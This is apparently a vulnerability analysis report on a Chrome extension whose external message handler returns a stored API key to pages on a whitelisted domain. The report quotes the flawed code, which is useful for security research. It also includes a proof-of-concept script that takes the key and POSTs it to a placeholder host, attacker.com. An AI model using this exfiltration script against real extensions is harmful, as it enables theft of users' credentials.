# CoCo Analysis: albdahjdcmldbcpjmbnbcbckgndaibnk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/albdahjdcmldbcpjmbnbcbckgndaibnk/opgen_generated_files/bg.js
Line 727	var storage_sync_get_source = { 'key': 'value' }; (CoCo framework code)
Line 994	if (data.axapi.isURL) {
Line 1001	key: data.axapi.host,

**Code:**

```javascript
// Background script - External message handler (bg.js line 991-1007)
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        chrome.storage.sync.get("axapi", function(data) {
            // ← data from storage (contains API key stored as data.axapi.host)
            if (data.axapi.isURL) {
                sendResponse({
                    message: "No API key",
                    success: false
                });
            } else {
                sendResponse({
                    key: data.axapi.host,  // ← Sends stored API key to external caller
                    message: "Found API key",
                    success: true
                });
            }
        });
    }
);
```

**manifest.json externally_connectable:**
```json
"externally_connectable": {
    "matches": ["*://*.aquila.network/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// On any page matching *://*.aquila.network/*
chrome.runtime.sendMessage('albdahjdcmldbcpjmbnbcbckgndaibnk', {}, function(response) {
    if (response && response.success) {
        console.log('Stolen API key:', response.key);
        // Send to attacker's server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({ apiKey: response.key })
        });
    }
});
```

**Impact:** Information disclosure - An external attacker controlling any subdomain or page on aquila.network can exfiltrate the user's stored API key (stored as `data.axapi.host`) by sending an external message to the extension. The extension responds with the sensitive API key value, which the attacker can then exfiltrate to their own server. This violates user privacy and compromises the security of the user's API credentials.
